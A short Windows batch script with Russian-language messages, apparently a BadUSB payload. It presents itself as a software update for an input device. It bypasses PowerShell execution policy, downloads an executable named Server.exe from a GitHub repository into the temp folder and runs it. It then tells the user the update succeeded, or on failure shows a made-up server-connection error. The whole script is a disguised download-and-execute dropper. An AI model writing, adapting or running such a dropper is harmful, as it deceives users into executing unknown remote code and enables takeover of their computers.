@echo off
chcp 65001 >nul

echo Скачивание обновления программного обеспечения для устройства ввода...
powershell -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/Aeraelz/test-badusb/raw/refs/heads/main/Server.exe' -OutFile '%temp%\Server.exe'"

if exist "%temp%\Server.exe" (
    echo Установка обновления...
    start "" "%temp%\Server.exe"
    echo Успешно обновлено
    pause
	exit
) else (
    echo Установка обновления...
    echo Отсутствует связь с сервером, попробуйте позже
    pause
	exit
)